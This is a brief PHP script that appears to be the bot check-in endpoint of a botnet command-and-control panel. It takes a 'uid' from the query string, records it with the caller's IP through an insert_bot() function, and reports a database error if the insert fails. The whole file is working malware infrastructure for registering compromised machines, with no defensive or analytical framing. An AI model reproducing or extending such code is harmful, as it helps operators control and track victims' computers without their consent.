<?php
require 'includes/php/wicked.php';
require 'includes/php/utils.php';

@$uid = htmlspecialchars($_GET['uid']);
@$ip  = get_client_ip();

if ($uid != '')
{
    try
    {
        insert_bot($uid, ip2long($ip));
    }
    catch (PDOException $ex)
    {
        echo 'Failed to insert bot into database!';
    }
}

?>